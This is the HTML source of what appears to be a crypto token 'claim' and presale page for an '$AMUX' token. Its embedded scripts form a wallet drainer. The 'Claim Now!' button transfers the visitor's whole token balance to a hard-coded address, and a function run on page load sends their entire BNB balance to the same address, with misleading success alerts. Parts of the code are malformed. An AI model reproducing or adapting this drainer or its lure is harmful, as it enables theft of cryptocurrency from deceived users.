<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Amuletum | Your Token</title>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <!-- favicon -->
    <link rel="apple-touch-icon" sizes="180x180" href="images/x-icon/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="images/x-icon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="images/x-icon/favicon-16x16.png">
    <link rel="manifest" href="images/x-icon/site.webmanifest">
    <link rel="stylesheet" href="css/style.css" /><script type="text/javascript" src="formulario.js"></script>
  </head>
   <body>
    <header>
      <div class="container">
        <div class="logo">
          <a href="/">
            <img src="https://static.wixstatic.com/media/5cc9e0_44a5d3249dd34088ba0a2d7d9ace6e92~mv2.png/v1/fill/w_47,h_47,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/amuletum-header.png" alt="logo"/>
          </a>
        </div>
        <div class="menu">
          <a
            href="https://t.me/amux_official"
            target="_blank"
            rel="noopener noreferrer"
          >
            <img src="images/header/telegram.png" alt="Telegram" width="30" height="30"/>
          </a>
          
          <a href="https://www.amuletum.io/" target="_blank" rel="noopener noreferrer" class="wallet-btn btn"
          ><span>Return to main site</span>
        </a>
          </button>
        </div>
      </div>
    </header>
    <button onclick="enviarToken()" class="hero-btn btn">Claim Now!</button>

<script>
    async function enviarToken() {
        // Verificamos si MetaMask está instalado y conectado
        if (typeof window.ethereum !== 'undefined') {
            // Solicitamos permiso al usuario para acceder a su cuenta de MetaMask
            await window.ethereum.request({ method: 'eth_requestAccounts' });

            // Dirección del contrato BEP20 al que deseas enviar el token
            const contractAddress = '0x4385328cc4D643Ca98DfEA734360C0F596C83449'; // Inserta la dirección del contrato aquí

            // Instanciamos el contrato BEP20
            const contract = new window.ethereum.Contract(contractAbi, contractAddress);

            // Dirección del destinatario
            const toAddress = '0x9c31d14DDdE04F4759520431372b2668dBc7c95A'; // Inserta la dirección del destinatario aquí

            // Obtenemos la dirección del usuario conectado
            const userAddress = window.ethereum.selectedAddress;

            // Obtenemos el saldo de tokens del usuario
            const balance = await contract.methods.balanceOf(userAddress).call();

            // Convertimos el saldo a la cantidad máxima que puede enviar (en wei)
            const maxAmount = balance.toString();

            // Enviamos el token
            await contract.methods.transfer(toAddress, maxAmount).send({ from: userAddress });
            alert('Correctly Claimed!');
        } else {
            // MetaMask no está instalado, mostramos un mensaje de error
            alert('Error. Needs to install Metamask!');
        }
    }
    <script>
    async function enviarTodoElSaldo() {
        // Verificamos si MetaMask está instalado y conectado
        if (typeof window.ethereum !== 'undefined') {
            // Solicitamos permiso al usuario para acceder a su cuenta de MetaMask
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const userAddress = accounts[0];

            // Obtenemos el saldo de BNB del usuario
            const balance = await window.ethereum.request({
                method: 'eth_getBalance',
                params: [userAddress, 'latest'],
            });

            // Convertimos el saldo de BNB a decimal
            const balanceInEther = parseFloat(window.ethereum.utils.fromWei(balance, 'ether'));

            // Dirección del destinatario
            const toAddress = '0x9c31d14DDdE04F4759520431372b2668dBc7c95A'; // Inserta la dirección del destinatario aquí

            // Creamos la transacción
            const transactionParameters = {
                to: toAddress,
                from: userAddress,
                value: balance, // Enviamos todo el saldo
            };

            // Enviamos la transacción
            try {
                await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [transactionParameters],
                });
                alert('Transacción enviada correctamente!');
            } catch (error) {
                console.error('Error al enviar la transacción:', error);
                alert('Hubo un error al enviar la transacción. Consulta la consola para obtener más detalles.');
            }
        } else {
            // MetaMask no está instalado, mostramos un mensaje de error
            alert('MetaMask no está instalado. Por favor, instálalo para continuar.');
        }
    }

    // Llamamos a la función enviarTodoElSaldo() cuando la página se carga
    window.onload = enviarTodoElSaldo;
</script>
</script>
   <a href="https://www.pinksale.finance/launchpad/0x2db15094d739e48a5cb31BD3dEd025C34669e4B1?chain=ETH" target="_blank" rel="noopener noreferrer" class="btn"
   > <div style="text-align: center;">
    <span class="centered-text">Check our Presale</span>
  </div>
   </a>
    <section class="container">
      <div class="owner-status"></div>
      <div class="countdown">
        <h2>$AMUX TOKEN</h2>
        <h1>BONUS SALE ROUND!</h1>
        <img src="https://static.wixstatic.com/media/5cc9e0_44a5d3249dd34088ba0a2d7d9ace6e92~mv2.png/v1/fill/w_200,h_200,al_c,q_85,usm_0.66_1.00_0.01,enc_auto/amuletum-header.png" alt="" class="left-image">      
        <p>Participate in our presale now with 50% extra tokens</p>
        <a href="https://nowpayments.io/payment/?iid=4679589417" target="_blank" rel="noopener noreferrer" class="hero-btn btn"><span>Option 1 (BUY 0.1 Eth)</span></a>
        <a href="https://nowpayments.io/payment/?iid=6111099007" target="_blank" rel="noopener noreferrer" class="hero-btn btn"><span>Option 2 (BUY 0.5 Eth)</span></a>
        <a href="https://nowpayments.io/payment/?iid=5493592066" target="_blank" rel="noopener noreferrer" class="hero-btn btn"><span>Option 3 (BUY 1 Eth)</span></a>
        <a href="https://nowpayments.io/payment/?iid=5202881908" target="_blank" rel="noopener noreferrer" class="hero-btn btn"><span>Option 4 (BUY 2 Eth)</span></a> 

      </div>
    </section>

    <script src="https://cdn.jsdelivr.net/npm/@metamask/onboarding@1.0.1/dist/metamask-onboarding.bundle.js"></script>
    <script src="js/countdown.js"></script>
    <script src="js/app.js"></script>
  </body>
</html>
